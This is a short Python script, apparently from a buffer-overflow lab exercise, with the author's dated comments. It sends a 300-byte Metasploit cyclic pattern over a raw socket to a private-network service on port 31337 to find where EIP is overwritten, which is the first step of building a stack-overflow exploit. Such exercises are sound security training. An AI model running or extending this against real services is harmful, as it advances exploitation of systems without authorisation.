#06-20-2020 DC:  This is a client, not a server.  
#jkjk
#06-20-2020 DC:  This b.py script will send a 300-byte pattern so I can use "msf-pattern_offset -q" (exact syntax)
#to figure out where the EIP is being overwritten.
#06-20-2020 DC:  I'm only using 300 because I happen to know the number is smaller than that.


#!/usr/bin/python

import socket

target_host = "10.0.2.7"
target_port = 31337
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9" 

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host,target_port))

client.send("GET / HTTP/1.0\r\nHOST: 10.0.2.7\r\n\r\n")
client.send("220 " + payload + "\r\n")

response = client.recv(4096)
